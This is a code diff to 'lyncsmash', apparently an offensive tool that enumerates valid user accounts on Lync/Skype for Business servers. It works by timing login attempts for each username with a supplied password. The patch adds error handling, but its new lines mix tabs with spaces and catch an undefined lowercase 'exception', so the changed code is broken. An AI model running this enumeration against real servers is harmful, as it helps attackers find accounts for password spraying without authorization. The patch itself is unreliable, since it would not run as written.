@@ -155,8 +155,9 @@ def timing_attack(host,userfilepath,password,domain):
         f.write("Started lyncsmash at {0}\n".format(currenttime))
         with open(os.path.abspath(userfilepath)) as user_file:
              for user in user_file:
+		try:
                  response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
-                 candidatevalue=float(float(response_time)/timeout)
+		 candidatevalue=float(float(response_time)/timeout)
                  if candidatevalue <= float("0.4"):
                      if isDisabled:
                          status="VALID USER, ACCOUNT DISABLED: {0}, Password: {1} Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
@@ -174,8 +175,12 @@ def timing_attack(host,userfilepath,password,domain):
                          status="INVALID USER: {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
                          print_error(status)
                          f.write("[-] {0}\n".format(status))
-                 #print ''
+		except exception as error:
+			continue
+
+              #print ''
         user_file.close()
+
 
 
 # Determine the baseline timeout for invalid username
@@ -272,3 +277,4 @@ def print_warn(msg):
 if __name__ == '__main__':
         main()
 	
+
